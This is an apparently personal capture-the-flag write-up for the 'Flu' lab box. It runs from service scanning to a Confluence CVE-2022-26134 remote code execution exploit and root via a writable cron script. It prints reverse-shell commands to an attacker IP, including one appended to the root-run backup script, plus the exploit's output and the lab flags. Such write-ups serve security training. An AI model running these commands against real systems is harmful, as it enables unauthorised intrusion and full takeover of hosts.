# CTF Writeup: Flu

---

## Reconaissance

An initial scan revealed the following information about running services on the target system.

```
nmap -A -p- --min-rate 10000 192.168.130.41
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-28 06:50 EST
Nmap scan report for 192.168.130.41
Host is up (0.029s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 02:79:64:84:da:12:97:23:77:8a:3a:60:20:96:ee:cf (ECDSA)
|_  256 dd:49:a3:89:d7:57:ca:92:f0:6c:fe:59:a6:24:cc:87 (ED25519)
8090/tcp open  http     Apache Tomcat (language: en)
| http-title: Log In - Confluence
|_Requested resource was /login.action?os_destination=%2Findex.action&permissionViolation=true
|_http-trane-info: Problem with XML parsing of /evox/about
8091/tcp open  jamlink?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 204 No Content
|     Server: Aleph/0.4.6
|     Date: Sun, 28 Dec 2025 11:51:31 GMT
|     Connection: Close
|   GetRequest: 
|     HTTP/1.1 204 No Content
|     Server: Aleph/0.4.6
|     Date: Sun, 28 Dec 2025 11:51:00 GMT
|     Connection: Close
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Access-Control-Allow-Origin: *
|     Access-Control-Max-Age: 31536000
|     Access-Control-Allow-Methods: OPTIONS, GET, PUT, POST
|     Server: Aleph/0.4.6
|     Date: Sun, 28 Dec 2025 11:51:00 GMT
|     Connection: Close
|     content-length: 0
|   Help, Kerberos, LDAPSearchReq, LPDString, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 414 Request-URI Too Long
|     text is empty (possibly HTTP/0.9)
|   RTSPRequest: 
|     HTTP/1.1 200 OK
|     Access-Control-Allow-Origin: *
|     Access-Control-Max-Age: 31536000
|     Access-Control-Allow-Methods: OPTIONS, GET, PUT, POST
|     Server: Aleph/0.4.6
|     Date: Sun, 28 Dec 2025 11:51:00 GMT
|     Connection: Keep-Alive
|     content-length: 0
|   SIPOptions: 
|     HTTP/1.1 200 OK
|     Access-Control-Allow-Origin: *
|     Access-Control-Max-Age: 31536000
|     Access-Control-Allow-Methods: OPTIONS, GET, PUT, POST
|     Server: Aleph/0.4.6
|     Date: Sun, 28 Dec 2025 11:51:36 GMT
|     Connection: Keep-Alive
|_    content-length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8091-TCP:V=7.95%I=7%D=12/28%Time=695119A4%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,68,"HTTP/1\.1\x20204\x20No\x20Content\r\nServer:\x20Aleph/0\.
SF:4\.6\r\nDate:\x20Sun,\x2028\x20Dec\x202025\x2011:51:00\x20GMT\r\nConnec
SF:tion:\x20Close\r\n\r\n")%r(HTTPOptions,EC,"HTTP/1\.1\x20200\x20OK\r\nAc
SF:cess-Control-Allow-Origin:\x20\*\r\nAccess-Control-Max-Age:\x2031536000
SF:\r\nAccess-Control-Allow-Methods:\x20OPTIONS,\x20GET,\x20PUT,\x20POST\r
SF:\nServer:\x20Aleph/0\.4\.6\r\nDate:\x20Sun,\x2028\x20Dec\x202025\x2011:
SF:51:00\x20GMT\r\nConnection:\x20Close\r\ncontent-length:\x200\r\n\r\n")%
SF:r(RTSPRequest,F1,"HTTP/1\.1\x20200\x20OK\r\nAccess-Control-Allow-Origin
SF::\x20\*\r\nAccess-Control-Max-Age:\x2031536000\r\nAccess-Control-Allow-
SF:Methods:\x20OPTIONS,\x20GET,\x20PUT,\x20POST\r\nServer:\x20Aleph/0\.4\.
SF:6\r\nDate:\x20Sun,\x2028\x20Dec\x202025\x2011:51:00\x20GMT\r\nConnectio
SF:n:\x20Keep-Alive\r\ncontent-length:\x200\r\n\r\n")%r(Help,46,"HTTP/1\.1
SF:\x20414\x20Request-URI\x20Too\x20Long\r\n\r\ntext\x20is\x20empty\x20\(p
SF:ossibly\x20HTTP/0\.9\)")%r(SSLSessionReq,46,"HTTP/1\.1\x20414\x20Reques
SF:t-URI\x20Too\x20Long\r\n\r\ntext\x20is\x20empty\x20\(possibly\x20HTTP/0
SF:\.9\)")%r(TerminalServerCookie,46,"HTTP/1\.1\x20414\x20Request-URI\x20T
SF:oo\x20Long\r\n\r\ntext\x20is\x20empty\x20\(possibly\x20HTTP/0\.9\)")%r(
SF:TLSSessionReq,46,"HTTP/1\.1\x20414\x20Request-URI\x20Too\x20Long\r\n\r\
SF:ntext\x20is\x20empty\x20\(possibly\x20HTTP/0\.9\)")%r(Kerberos,46,"HTTP
SF:/1\.1\x20414\x20Request-URI\x20Too\x20Long\r\n\r\ntext\x20is\x20empty\x
SF:20\(possibly\x20HTTP/0\.9\)")%r(FourOhFourRequest,68,"HTTP/1\.1\x20204\
SF:x20No\x20Content\r\nServer:\x20Aleph/0\.4\.6\r\nDate:\x20Sun,\x2028\x20
SF:Dec\x202025\x2011:51:31\x20GMT\r\nConnection:\x20Close\r\n\r\n")%r(LPDS
SF:tring,46,"HTTP/1\.1\x20414\x20Request-URI\x20Too\x20Long\r\n\r\ntext\x2
SF:0is\x20empty\x20\(possibly\x20HTTP/0\.9\)")%r(LDAPSearchReq,46,"HTTP/1\
SF:.1\x20414\x20Request-URI\x20Too\x20Long\r\n\r\ntext\x20is\x20empty\x20\
SF:(possibly\x20HTTP/0\.9\)")%r(SIPOptions,F1,"HTTP/1\.1\x20200\x20OK\r\nA
SF:ccess-Control-Allow-Origin:\x20\*\r\nAccess-Control-Max-Age:\x203153600
SF:0\r\nAccess-Control-Allow-Methods:\x20OPTIONS,\x20GET,\x20PUT,\x20POST\
SF:r\nServer:\x20Aleph/0\.4\.6\r\nDate:\x20Sun,\x2028\x20Dec\x202025\x2011
SF::51:36\x20GMT\r\nConnection:\x20Keep-Alive\r\ncontent-length:\x200\r\n\
SF:r\n");
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 199/tcp)
HOP RTT      ADDRESS
1   28.23 ms 192.168.45.1
2   28.05 ms 192.168.45.254
3   30.07 ms 192.168.251.1
4   28.68 ms 192.168.130.41

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 122.36 seconds
```

Started of by enumerating the webpage running on port 8090.

Enumerated endpoints and found an /admin endpoint.

```
feroxbuster -u http://192.168.130.41:8090 
                                                                                                                                              
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.130.41:8090/
 🚩  In-Scope Url          │ 192.168.130.41
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
302      GET        0l        0w        0c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET      279l      779w    25650c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET       94l      450w    19618c http://192.168.130.41:8090/styles/html
404      GET       94l      450w    19618c http://192.168.130.41:8090/styles/graphics
404      GET       94l      450w    19618c http://192.168.130.41:8090/styles/cms
[>-------------------] - 29s     5134/840084  79m     found:3       errors:694    
🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_192_168_130_41_8090_-1766923140.state ...
[>-------------------] - 29s     5136/840084  79m     found:3       errors:696    
[>-------------------] - 29s      469/30000   16/s    http://192.168.130.41:8090/ 
[>-------------------] - 29s      374/30000   13/s    http://192.168.130.41:8090/includes/ 
[>-------------------] - 28s      356/30000   13/s    http://192.168.130.41:8090/admin/ 
[>-------------------] - 28s      338/30000   12/s    http://192.168.130.41:8090/images/ 
[>-------------------] - 28s      302/30000   11/s    http://192.168.130.41:8090/search/ 
[>-------------------] - 25s      250/30000   10/s    http://192.168.130.41:8090/content/ 
[>-------------------] - 25s      250/30000   10/s    http://192.168.130.41:8090/ajax/ 
[>-------------------] - 27s      187/30000   7/s     http://192.168.130.41:8090/styles/ 
[>-------------------] - 27s      250/30000   9/s     http://192.168.130.41:8090/template/ 
[>-------------------] - 27s      229/30000   8/s     http://192.168.130.41:8090/includes/js/ 
[>-------------------] - 24s      201/30000   8/s     http://192.168.130.41:8090/includes/components/ 
[>-------------------] - 23s      206/30000   9/s     http://192.168.130.41:8090/includes/css/ 
[>-------------------] - 27s      204/30000   8/s     http://192.168.130.41:8090/pages/ 
[>-------------------] - 23s      201/30000   9/s     http://192.168.130.41:8090/about/ 
[>-------------------] - 24s      202/30000   8/s     http://192.168.130.41:8090/users/ 
[>-------------------] - 25s      205/30000   8/s     http://192.168.130.41:8090/images/themes/ 
[>-------------------] - 26s      155/30000   6/s     http://192.168.130.41:8090/errors/ 
[>-------------------] - 23s      100/30000   4/s     http://192.168.130.41:8090/template/includes/ 
[>-------------------] - 23s      100/30000   4/s     http://192.168.130.41:8090/includes/js/admin/ 
[>-------------------] - 23s       53/30000   2/s     http://192.168.130.41:8090/includes/js/components/ 
[>-------------------] - 17s       50/30000   3/s     http://192.168.130.41:8090/pages/templates/ 
[>-------------------] - 17s       50/30000   3/s     http://192.168.130.41:8090/pages/includes/ 
[>-------------------] - 18s       60/30000   3/s     http://192.168.130.41:8090/includes/css/admin/ 
[>-------------------] - 17s       50/30000   3/s     http://192.168.130.41:8090/includes/css/components/ 
[>-------------------] - 18s       12/30000   1/s     http://192.168.130.41:8090/includes/js/api/ 
[--------------------] - 12s        0/30000   0/s     http://192.168.130.41:8090/pages/help/ 
[--------------------] - 13s        0/30000   0/s     http://192.168.130.41:8090/users/help/
```

We got forwarded to an login page, with version information Confluence 7.13.6

## Vulnerability Assessment

Let's search up for CVE's.

Found an RCE Exploit.

```
git clone https://github.com/jbaines-r7/through_the_wire.git
```

## Initial Access

Ran the exploit & gained RCE as user "confluence".

```
python3 through_the_wire.py --rhost 192.168.130.41 --rport 8090 --lhost 192.168.45.221 --lport 22 --protocol http:// --reverse-shell
/home/saitama/Desktop/Exploiting/OSCP_Prep/ProvingGrounds/Linux/Flu/through_the_wire/through_the_wire.py:24: SyntaxWarning: invalid escape sequence '\ '
  print("  /__   \ |__  _ __ ___  _   _  __ _| |__  ")
/home/saitama/Desktop/Exploiting/OSCP_Prep/ProvingGrounds/Linux/Flu/through_the_wire/through_the_wire.py:25: SyntaxWarning: invalid escape sequence '\/'
  print("    / /\/ '_ \| '__/ _ \| | | |/ _` | '_ \ ")
/home/saitama/Desktop/Exploiting/OSCP_Prep/ProvingGrounds/Linux/Flu/through_the_wire/through_the_wire.py:27: SyntaxWarning: invalid escape sequence '\/'
  print("   \/   |_| |_|_|  \___/ \__,_|\__, |_| |_|")
/home/saitama/Desktop/Exploiting/OSCP_Prep/ProvingGrounds/Linux/Flu/through_the_wire/through_the_wire.py:30: SyntaxWarning: invalid escape sequence '\ '
  print("  /__   \ |__   ___  / / /\ \ (_)_ __ ___  ")
/home/saitama/Desktop/Exploiting/OSCP_Prep/ProvingGrounds/Linux/Flu/through_the_wire/through_the_wire.py:31: SyntaxWarning: invalid escape sequence '\/'
  print("    / /\/ '_ \ / _ \ \ \/  \/ / | '__/ _ \ ")
/home/saitama/Desktop/Exploiting/OSCP_Prep/ProvingGrounds/Linux/Flu/through_the_wire/through_the_wire.py:32: SyntaxWarning: invalid escape sequence '\ '
  print("   / /  | | | |  __/  \  /\  /| | | |  __/ ")
/home/saitama/Desktop/Exploiting/OSCP_Prep/ProvingGrounds/Linux/Flu/through_the_wire/through_the_wire.py:33: SyntaxWarning: invalid escape sequence '\/'
  print("   \/   |_| |_|\___|   \/  \/ |_|_|  \___| ")

   _____ _                           _     
  /__   \ |__  _ __ ___  _   _  __ _| |__  
    / /\/ '_ \| '__/ _ \| | | |/ _` | '_ \ 
   / /  | | | | | | (_) | |_| | (_| | | | |
   \/   |_| |_|_|  \___/ \__,_|\__, |_| |_|
                               |___/       
   _____ _            __    __ _           
  /__   \ |__   ___  / / /\ \ (_)_ __ ___  
    / /\/ '_ \ / _ \ \ \/  \/ / | '__/ _ \ 
   / /  | | | |  __/  \  /\  /| | | |  __/ 
   \/   |_| |_|\___|   \/  \/ |_|_|  \___| 

                 jbaines-r7                
               CVE-2022-26134              
      "Spit my soul through the wire"    
                     🦞                   

[+] Forking a netcat listener
[+] Using /usr/bin/nc
[+] Generating a reverse shell payload
[+] Sending expoit at http://192.168.130.41:8090/
listening on [any] 22 ...
connect to [192.168.45.221] from (UNKNOWN) [192.168.130.41] 58288
bash: cannot set terminal process group (833): Inappropriate ioctl for device
bash: no job control in this shell
confluence@flu:/opt/atlassian/confluence/bin$
```

Retrieved local.txt in /home/confluence directory.

```
0e84be683309106686afc5bd5880c527
```

## Privilege Escalation

Performed Shell Hardening.

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL +Z
stty raw -echo ; fg ; reset
stty columns 200 rows 200
export TERM=xterm
```

Checked for writable files.

```
confluence@flu:/opt/atlassian/confluence/bin$ find / -type f -writable 2>/dev/null -not -path "/opt/*" -not -path "/var/*" -not -path "/sys/* -not -path "/proc/*"
/home/confluence/local.txt
/home/confluence/.bash_history
/home/confluence/.java/fonts/11.0.14.1/fcinfo-1-flu-Ubuntu-23.04-en.properties
/tmp/hsperfdata_confluence/1125
/tmp/hsperfdata_confluence/1426
```

Since the lab description hints at an cronjob. Let's download pspy64s onto the target system.

```
python3 -m http.server 80
```

Downloaded it.

```
confluence@flu:/tmp$ wget http://192.168.45.221/pspy64s
--2025-12-28 12:21:38--  http://192.168.45.221/pspy64s
Connecting to 192.168.45.221:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1233888 (1.2M) [application/octet-stream]
Saving to: ‘pspy64s’

pspy64s                                             0%[                                                                                       pspy64s                                            14%[==============>                                                                        pspy64s                                            66%[========================================================================>              pspy64s                                            99%[=======================================================================================pspy64s                                           100%[=============================================================================================================>]   1.18M  1.79MB/s    in 0.7s    

2025-12-28 12:21:38 (1.79 MB/s) - ‘pspy64s’ saved [1233888/1233888]
```

Executed it and found an script being executed by root on a running cronjob.

```
confluence@flu:/tmp$ ./pspy64s 
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2025/12/28 12:21:48 CMD: UID=1001  PID=2391   | ./pspy64s 
2025/12/28 12:21:48 CMD: UID=1001  PID=2320   | /bin/bash 
2025/12/28 12:21:48 CMD: UID=1001  PID=2319   | python3 -c import pty;pty.spawn("/bin/bash") 
2025/12/28 12:21:48 CMD: UID=1001  PID=2303   | bash -i 
2025/12/28 12:21:48 CMD: UID=1001  PID=2301   | bash -i 
2025/12/28 12:21:48 CMD: UID=1001  PID=2299   | bash -c bash -i >& /dev/tcp/192.168.45.221/22 0>&1 
2025/12/28 12:21:48 CMD: UID=0     PID=2294   | 
2025/12/28 12:21:48 CMD: UID=1001  PID=2280   | find / -type f -writable 
2025/12/28 12:21:48 CMD: UID=1001  PID=2191   | /bin/bash 
2025/12/28 12:21:48 CMD: UID=1001  PID=2190   | python3 -c import pty;pty.spawn("/bin/bash") 
2025/12/28 12:21:48 CMD: UID=1001  PID=2188   | bash -i 
2025/12/28 12:21:48 CMD: UID=0     PID=2177   | 
2025/12/28 12:21:48 CMD: UID=1001  PID=2168   | /bin/bash 
2025/12/28 12:21:48 CMD: UID=1001  PID=2167   | python3 -c import pty;pty.spawn("/bin/bash") 
2025/12/28 12:21:48 CMD: UID=1001  PID=2163   | bash -i 
2025/12/28 12:21:48 CMD: UID=1001  PID=2161   | bash -c bash -i >& /dev/tcp/192.168.45.221/22 0>&1 
2025/12/28 12:21:48 CMD: UID=0     PID=2081   | 
2025/12/28 12:21:48 CMD: UID=0     PID=2080   | 
2025/12/28 12:21:48 CMD: UID=0     PID=1868   | 
2025/12/28 12:21:48 CMD: UID=0     PID=1812   | sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups 
2025/12/28 12:21:48 CMD: UID=1001  PID=1426   | /opt/atlassian/confluence/jre/bin/java -classpath /opt/atlassian/confluence/temp/4.0.0-master-3b3337da.jar:/opt/atlassian/confluence/confluence/WEB-INF/lib/mysql-connector-java-8.2.0.jar -Xss2048k -Xmx2g synchrony.core sql              
2025/12/28 12:21:48 CMD: UID=1001  PID=1125   | /opt/atlassian/confluence/jre//bin/java -Djava.util.logging.config.file=/opt/atlassian/confluence/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -Datlassian.plugins.startup.options= -Dorg.apache.tomcat.websocket.DEFAULT_BUFFER_SIZE=32768 -Dconfluence.context.path= -Djava.locale.providers=JRE,SPI,CLDR -Dsynchrony.enable.xhr.fallback=true -Datlassian.plugins.enable.wait=300 -Djava.awt.headless=true -Xloggc:/opt/atlassian/confluence/logs/gc-2025-11-14_12-31-08.log -XX:+UseGCLogFileRotation -XX:NumberOfGCLogFiles=5 -XX:GCLogFileSize=2M -Xlog:gc+age=debug:file=/opt/atlassian/confluence/logs/gc-2025-11-14_12-31-08.log::filecount=5,filesize=2M -XX:G1ReservePercent=20 -XX:+UseG1GC -XX:+ExplicitGCInvokesConcurrent -XX:+PrintGCDateStamps -XX:+IgnoreUnrecognizedVMOptions -XX:ReservedCodeCacheSize=256m -Xms1024m -Xmx1024m -Dignore.endorsed.dirs= -classpath /opt/atlassian/confluence/bin/bootstrap.jar:/opt/atlassian/confluence/bin/tomcat-juli.jar -Dcatalina.base=/opt/atlassian/confluence -Dcatalina.home=/opt/atlassian/confluence -Djava.io.tmpdir=/opt/atlassian/confluence/temp org.apache.catalina.startup.Bootstrap start                                                    
2025/12/28 12:21:48 CMD: UID=109   PID=1037   | /usr/sbin/mysqld 
2025/12/28 12:21:48 CMD: UID=103   PID=1023   | /usr/sbin/rsyslogd -n -iNONE 
2025/12/28 12:21:48 CMD: UID=0     PID=950    | /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal 
2025/12/28 12:21:48 CMD: UID=0     PID=868    | /sbin/agetty -o -p -- \u --noclear - linux 
2025/12/28 12:21:48 CMD: UID=0     PID=832    | /usr/sbin/ModemManager 
2025/12/28 12:21:48 CMD: UID=0     PID=829    | /usr/libexec/udisks2/udisksd 
2025/12/28 12:21:48 CMD: UID=0     PID=827    | /lib/systemd/systemd-logind 
2025/12/28 12:21:48 CMD: UID=0     PID=817    | /usr/lib/snapd/snapd 
2025/12/28 12:21:48 CMD: UID=0     PID=791    | /usr/libexec/polkitd --no-debug 
2025/12/28 12:21:48 CMD: UID=0     PID=775    | /usr/sbin/irqbalance --foreground 
2025/12/28 12:21:48 CMD: UID=100   PID=755    | @dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only                                                                                                                                            
2025/12/28 12:21:48 CMD: UID=0     PID=750    | /usr/sbin/cron -f -P 
2025/12/28 12:21:48 CMD: UID=0     PID=607    | 
2025/12/28 12:21:48 CMD: UID=0     PID=600    | /usr/bin/vmtoolsd 
2025/12/28 12:21:48 CMD: UID=0     PID=599    | /usr/bin/VGAuthService 
2025/12/28 12:21:48 CMD: UID=997   PID=593    | /lib/systemd/systemd-timesyncd 
2025/12/28 12:21:48 CMD: UID=996   PID=587    | /lib/systemd/systemd-resolved 
2025/12/28 12:21:48 CMD: UID=998   PID=583    | /lib/systemd/systemd-networkd 
2025/12/28 12:21:48 CMD: UID=0     PID=566    | 
2025/12/28 12:21:48 CMD: UID=0     PID=565    | 
2025/12/28 12:21:48 CMD: UID=0     PID=561    | 
2025/12/28 12:21:48 CMD: UID=0     PID=560    | 
2025/12/28 12:21:48 CMD: UID=0     PID=459    | /lib/systemd/systemd-udevd 
2025/12/28 12:21:48 CMD: UID=0     PID=458    | /sbin/multipathd -d -s 
2025/12/28 12:21:48 CMD: UID=0     PID=457    | 
2025/12/28 12:21:48 CMD: UID=0     PID=456    | 
2025/12/28 12:21:48 CMD: UID=0     PID=452    | 
2025/12/28 12:21:48 CMD: UID=0     PID=451    | 
2025/12/28 12:21:48 CMD: UID=0     PID=419    | /lib/systemd/systemd-journald 
2025/12/28 12:21:48 CMD: UID=0     PID=356    | 
2025/12/28 12:21:48 CMD: UID=0     PID=77     | 
2025/12/28 12:21:48 CMD: UID=0     PID=76     | 
2025/12/28 12:21:48 CMD: UID=0     PID=75     | 
2025/12/28 12:21:48 CMD: UID=0     PID=74     | 
2025/12/28 12:21:48 CMD: UID=0     PID=73     | 
2025/12/28 12:21:48 CMD: UID=0     PID=72     | 
2025/12/28 12:21:48 CMD: UID=0     PID=71     | 
2025/12/28 12:21:48 CMD: UID=0     PID=6      | 
2025/12/28 12:21:48 CMD: UID=0     PID=5      | 
2025/12/28 12:21:48 CMD: UID=0     PID=4      | 
2025/12/28 12:21:48 CMD: UID=0     PID=3      | 
2025/12/28 12:21:48 CMD: UID=0     PID=2      | 
2025/12/28 12:21:48 CMD: UID=0     PID=1      | /sbin/init 
2025/12/28 12:22:01 CMD: UID=0     PID=2401   | /usr/sbin/CRON -f -P 
2025/12/28 12:22:01 CMD: UID=0     PID=2402   | /usr/sbin/CRON -f -P 
2025/12/28 12:22:01 CMD: UID=0     PID=2403   | 
2025/12/28 12:22:01 CMD: UID=0     PID=2405   | cp -r /opt/atlassian/confluence//logs /root/backup/log_backup_20251228122201 
2025/12/28 12:22:01 CMD: UID=0     PID=2406   | 
2025/12/28 12:22:01 CMD: UID=0     PID=2407   | tar -czf /root/backup/log_backup_20251228122201.tar.gz /root/backup/log_backup_20251228122201 
2025/12/28 12:22:01 CMD: UID=0     PID=2408   | gzip 
2025/12/28 12:22:01 CMD: UID=0     PID=2409   | /bin/bash /opt/log-backup.sh 
2025/12/28 12:22:01 CMD: UID=0     PID=2410   | find /root/backup -name log_backup_* -mmin +5 -exec rm -rf {} ; 
2025/12/28 12:22:01 CMD: UID=0     PID=2411   | find /root/backup -name log_backup_* -mmin +5 -exec rm -rf {} ; 
2025/12/28 12:23:01 CMD: UID=0     PID=2412   | /usr/sbin/CRON -f -P 
2025/12/28 12:23:01 CMD: UID=0     PID=2413   | /usr/sbin/CRON -f -P 
2025/12/28 12:23:01 CMD: UID=0     PID=2414   | /bin/bash /opt/log-backup.sh 
2025/12/28 12:23:01 CMD: UID=0     PID=2415   | 
2025/12/28 12:23:01 CMD: UID=0     PID=2416   | cp -r /opt/atlassian/confluence//logs /root/backup/log_backup_20251228122301 
2025/12/28 12:23:01 CMD: UID=0     PID=2417   | /bin/bash /opt/log-backup.sh 
2025/12/28 12:23:01 CMD: UID=0     PID=2418   | 
2025/12/28 12:23:01 CMD: UID=0     PID=2419   | 
2025/12/28 12:23:01 CMD: UID=0     PID=2420   | /bin/bash /opt/log-backup.sh 
2025/12/28 12:23:01 CMD: UID=0     PID=2421   | rm -rf /root/backup/log_backup_20251228121801.tar.gz 
2025/12/28 12:23:01 CMD: UID=0     PID=2422   |
```

Checking permissions on the script, we can see that we have write access on the .sh script, let's add an bash reverse shell script inside.

```
confluence@flu:/opt$ ls -la
total 756692
drwxr-xr-x  3 root       root            4096 Dec 12  2023 .
drwxr-xr-x 19 root       root            4096 Dec 12  2023 ..
drwxr-xr-x  3 root       root            4096 Dec 12  2023 atlassian
-rwxr-xr-x  1 root       root       774829955 Dec 12  2023 atlassian-confluence-7.13.6-x64.bin
-rwxr-xr-x  1 confluence confluence       408 Dec 12  2023 log-backup.sh
```

Start up listener on port 8091.

```
nc -lvnp 8091
```

let's add an bash reverse shell script inside.

```
echo "/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.221/8091 0>&1'" >> log-backup.sh
```

The cronjob will execute the script with root perms.

Gained RCE as user "root":

```
nc -lvnp 8091                              
listening on [any] 8091 ...
connect to [192.168.45.221] from (UNKNOWN) [192.168.130.41] 38954
bash: cannot set terminal process group (2452): Inappropriate ioctl for device
bash: no job control in this shell
root@flu:~#
```

Retrieved proof.txt in /root directory.

```
7fee0de0c4736fcabc35f7092c78b585
```
